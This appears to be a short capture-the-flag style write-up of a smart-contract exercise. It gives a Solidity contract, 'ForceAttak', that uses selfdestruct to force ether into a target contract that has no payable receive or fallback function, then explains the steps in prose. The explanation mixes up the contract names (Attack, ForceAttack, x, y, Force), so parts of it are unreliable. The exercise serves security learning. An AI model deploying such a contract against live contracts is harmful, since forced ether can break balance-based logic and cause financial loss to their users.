```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttak {
    address public targetAddress;

    constructor (address _targetAddress) public {
        targetAddress = _targetAddress;
    }

    function attack() payable public {
        selfdestruct(payable(targetAddress));
    }
}
```

As Attack doesnot implement receive and fallback payable functions, there is a possible way to send ether to a contract that does not accept ether. This is possible via a selfdestruct function call:

Let's assume there is a contract ForceAttack that has some ether present in it.
Also, there is a contract Attack.
Contract ForceAttack calls the selfdestruct(address_of_contract_Attack) function.
This process sends all ether present in contract x to contract y.

Call the attack function with some ether and it will self destruct the ForceAttack contract and send all the ethers from ForceAttack to Force contract.